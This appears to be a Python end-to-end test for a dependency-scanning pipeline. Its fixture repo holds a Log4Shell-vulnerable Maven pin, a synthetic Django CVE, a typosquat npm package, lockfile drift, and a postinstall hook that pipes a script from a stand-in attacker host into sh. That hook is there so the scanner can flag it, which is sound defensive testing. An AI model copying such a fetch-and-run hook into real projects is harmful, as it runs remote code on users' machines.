"""Tier A end-to-end: every signal lands in the artefacts.

Builds a fixture repo that simultaneously triggers:

- a CVE-positive dep (Log4j 2.14.1, Maven) — vuln_findings + KEV + EPSS
- a reachable Python dep with a CVE — reachability='imported'
- a typosquat candidate (npm) — supply_chain
- a curl|sh ``postinstall`` script — supply_chain
- a manifest with no lockfile sibling — hygiene (lockfile_missing)
- a lockfile pinned away from a manifest's exact pin — hygiene (drift)

With a stubbed HttpClient the test runs offline; all four artefacts
(``findings.json``, ``report.md``, ``sbom.cdx.json``, ``coverage-sca.json``)
are checked for cross-cutting signal.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any, Dict

from core.http import HttpError
from core.json import JsonCache
from packages.sca.osv import OSV_QUERY_BATCH_URL, OSV_VULN_URL_TEMPLATE
from packages.sca.pipeline import RunOptions, run_sca


_LOG4J_RECORD = {
    "id": "GHSA-jfh8-c2jp-5v3q",
    "modified": "2024-01-01T00:00:00Z",
    "published": "2021-12-10T00:00:00Z",
    "aliases": ["CVE-2021-44228"],
    "summary": "Log4Shell",
    "details": "Remote code execution via JNDI lookup.",
    "affected": [{
        "package": {"ecosystem": "Maven",
                    "name": "org.apache.logging.log4j:log4j-core"},
        "ranges": [{"type": "ECOSYSTEM",
                    "events": [{"introduced": "2.0-beta9"},
                               {"fixed": "2.15.0"}]}],
    }],
    "severity": [{"type": "CVSS_V3",
                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"}],
    "references": [{"type": "WEB", "url": "https://example.com/log4shell"}],
}

_DJANGO_RECORD = {
    "id": "GHSA-django-fake",
    "modified": "2024-06-01T00:00:00Z",
    "published": "2024-06-01T00:00:00Z",
    "aliases": ["CVE-2024-FAKE-DJ"],
    "summary": "Synthetic Django CVE for E2E test",
    "details": "",
    "affected": [{
        "package": {"ecosystem": "PyPI", "name": "django"},
        "ranges": [{"type": "ECOSYSTEM",
                    "events": [{"introduced": "0"}, {"fixed": "5.0.0"}]}],
    }],
    "severity": [{"type": "CVSS_V3",
                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"}],
    "references": [],
}


class StubHttp:
    def __init__(self) -> None:
        self.posts: list = []
        self.gets: list = []

    def post_json(self, url: str, body: dict, timeout: int = 30) -> dict:
        self.posts.append((url, body))
        if url == OSV_QUERY_BATCH_URL:
            results = []
            for q in body["queries"]:
                pkg, ver = q["package"], q["version"]
                if (pkg["ecosystem"] == "Maven"
                        and pkg["name"] == "org.apache.logging.log4j:log4j-core"
                        and ver == "2.14.1"):
                    results.append({"vulns": [{"id": "GHSA-jfh8-c2jp-5v3q"}]})
                elif (pkg["ecosystem"] == "PyPI"
                      and pkg["name"] == "django"):
                    # Match either manifest (4.2.7) or lockfile (4.2.6) —
                    # the canonical view chooses one, both should map to
                    # the same vuln for OSV's purpose.
                    results.append({"vulns": [{"id": "GHSA-django-fake"}]})
                else:
                    results.append({})
            return {"results": results}
        raise RuntimeError(f"unexpected POST: {url}")

    def get_json(self, url: str, timeout: int = 30) -> dict:
        self.gets.append(url)
        if url == OSV_VULN_URL_TEMPLATE.format("GHSA-jfh8-c2jp-5v3q"):
            return _LOG4J_RECORD
        if url == OSV_VULN_URL_TEMPLATE.format("GHSA-django-fake"):
            return _DJANGO_RECORD
        if "cisa.gov" in url:
            return {"vulnerabilities": [{"cveID": "CVE-2021-44228"}]}
        if "first.org" in url:
            return {"data": [
                {"cve": "CVE-2021-44228", "epss": "0.97559"},
                {"cve": "CVE-2024-FAKE-DJ", "epss": "0.05"},
            ]}
        if "raw.githubusercontent.com/cisagov/vulnrichment" in url:
            # Vulnrichment per-CVE GET — return 404 so the lookup
            # falls through cleanly (no SSVC signal). Tests that
            # specifically want to exercise the SSVC path inject
            # their own response.
            raise HttpError(f"not found: {url}", status=404)
        raise RuntimeError(f"unexpected GET: {url}")

    def get_bytes(self, *a, **k):
        raise NotImplementedError


def _build_fixture(repo: Path) -> None:
    repo.mkdir(parents=True, exist_ok=True)

    # 1. Maven manifest with a Log4Shell-vulnerable version.
    (repo / "service").mkdir()
    (repo / "service" / "pom.xml").write_text("""\
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <groupId>com.example</groupId>
  <artifactId>svc</artifactId>
  <version>1.0.0</version>
  <licenses>
    <license><name>Apache-2.0</name></license>
  </licenses>
  <dependencies>
    <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-core</artifactId>
      <version>2.14.1</version>
    </dependency>
  </dependencies>
</project>
""", encoding="utf-8")

    # 2. Python project: vulnerable + actually-imported + a real
    #    requirements.txt with manifest+lockfile drift via Pipfile.lock.
    (repo / "backend").mkdir()
    (repo / "backend" / "requirements.txt").write_text(
        "django==4.2.7\n", encoding="utf-8",
    )
    (repo / "backend" / "Pipfile.lock").write_text(json.dumps({
        "_meta": {},
        "default": {
            "django": {"version": "==4.2.6"},   # drift from manifest 4.2.7
        },
        "develop": {},
    }), encoding="utf-8")
    (repo / "backend" / "src").mkdir()
    (repo / "backend" / "src" / "app.py").write_text(
        "import django\nprint(django.__version__)\n", encoding="utf-8",
    )

    # 3. Frontend: typosquat + curl|sh postinstall + caret-pin (no lockfile).
    (repo / "frontend").mkdir()
    (repo / "frontend" / "package.json").write_text(json.dumps({
        "name": "frontend",
        "version": "0.0.1",
        "license": "MIT",
        "scripts": {
            "postinstall": "curl https://evil.example/x.sh | sh",
        },
        "dependencies": {
            # 'loadash' is distance-1 from 'lodash' → typosquat candidate.
            "loadash": "^1.0.0",
        },
    }), encoding="utf-8")


def _read_json(path: Path) -> Any:
    return json.loads(path.read_text(encoding="utf-8"))


def test_tier_a_signals_all_present(tmp_path: Path) -> None:
    target = tmp_path / "repo"
    out = tmp_path / "out"
    _build_fixture(target)

    cache = JsonCache(root=tmp_path / "cache")
    http = StubHttp()
    result = run_sca(
        target=target, output_dir=out,
        options=RunOptions(enable_llm_review=False, enable_triage=False),
        http=http, cache=cache,
    )

    assert result.findings_path.exists()
    assert result.report_path.exists()
    assert result.sbom_path.exists()

    rows = _read_json(result.findings_path)
    by_type: Dict[str, list] = {}
    for r in rows:
        by_type.setdefault(r["vuln_type"], []).append(r)

    # ------------------------------------------------------------------
    # Vulnerable_dependency findings
    # ------------------------------------------------------------------
    vulns = by_type.get("sca:vulnerable_dependency", [])
    assert len(vulns) >= 2

    log4j = next(r for r in vulns
                 if r["sca"]["name"] == "org.apache.logging.log4j:log4j-core")
    assert log4j["sca"]["in_kev"] is True
    assert log4j["sca"]["epss"] is not None and log4j["sca"]["epss"] > 0.9
    assert log4j["sca"]["fixed_version"] == "2.15.0"
    # Maven reachability isn't supported — must be honest.
    assert log4j["sca"]["reachability"]["verdict"] == "not_evaluated"

    django = next(r for r in vulns if r["sca"]["name"] == "django")
    assert django["sca"]["reachability"]["verdict"] == "imported"
    assert any("backend/src/app.py" in line
               for line in django["sca"]["reachability"]["evidence"])
    # Lockfile-resolved version (4.2.6) wins over manifest pin (4.2.7).
    assert django["sca"]["version"] == "4.2.6"

    # ------------------------------------------------------------------
    # Supply-chain signals
    # ------------------------------------------------------------------
    sc_kinds = {r["vuln_type"]
                for r in rows
                if r["vuln_type"].startswith("sca:supply_chain:")}
    assert "sca:supply_chain:typosquat_candidate" in sc_kinds
    assert "sca:supply_chain:install_hook_suspicious" in sc_kinds
    install_hook = next(
        r for r in rows
        if r["vuln_type"] == "sca:supply_chain:install_hook_suspicious"
    )
    assert install_hook["severity"] == "high"     # curl|sh pattern hit
    assert any("curl piped" in r
               for r in install_hook["sca"]["evidence"]["reasons"])

    # ------------------------------------------------------------------
    # Hygiene signals
    # ------------------------------------------------------------------
    hyg_kinds = {r["vuln_type"]
                 for r in rows
                 if r["vuln_type"].startswith("sca:hygiene:")}
    # frontend has no package-lock sibling.
    assert "sca:hygiene:lockfile_missing" in hyg_kinds
    # Django pinned 4.2.7 / lockfile 4.2.6 → drift.
    assert "sca:hygiene:lockfile_drift" in hyg_kinds
    # Caret-pinned loadash → loose_pin.
    assert "sca:hygiene:loose_pin" in hyg_kinds

    # ------------------------------------------------------------------
    # SBOM (CycloneDX) — VEX block present + cross-references vulns
    # ------------------------------------------------------------------
    bom = _read_json(result.sbom_path)
    assert bom["bomFormat"] == "CycloneDX"
    assert any(c["name"] == "org.apache.logging.log4j:log4j-core"
               for c in bom["components"])
    vuln_block = bom.get("vulnerabilities", [])
    assert vuln_block, "VEX block expected when findings exist"
    # The Log4Shell entry should be marked exploitable via KEV (no
    # reachability for Maven; KEV is the fallback signal).
    log4j_vex = next(v for v in vuln_block if v["id"] == "GHSA-jfh8-c2jp-5v3q")
    assert log4j_vex["analysis"]["state"] == "exploitable"
    # The Django entry should be exploitable via reachability.
    django_vex = next(v for v in vuln_block if v["id"] == "GHSA-django-fake")
    assert django_vex["analysis"]["state"] == "exploitable"

    # ------------------------------------------------------------------
    # Markdown report — covers all sections
    # ------------------------------------------------------------------
    md = result.report_path.read_text(encoding="utf-8")
    assert "## Vulnerable dependencies" in md
    assert "## Supply-chain findings" in md
    assert "## Hygiene findings" in md
    assert "**KEV**" in md
    assert "log4j-core" in md
    assert "django" in md
    assert "loadash" in md

    # ------------------------------------------------------------------
    # Coverage record — manifests + reachability evidence files
    # ------------------------------------------------------------------
    cov = _read_json(out / "coverage-sca.json")
    assert cov["tool"] == "sca"
    examined = set(cov["files_examined"])
    assert "service/pom.xml" in examined
    assert "frontend/package.json" in examined
    assert "backend/requirements.txt" in examined
    # Reachability file must show up in coverage too.
    assert any("backend/src/app.py" in f for f in examined)
    # rules_applied tracks which analysis stages ran.
    rules = set(cov.get("rules_applied", []))
    assert "osv" in rules
    assert "hygiene" in rules
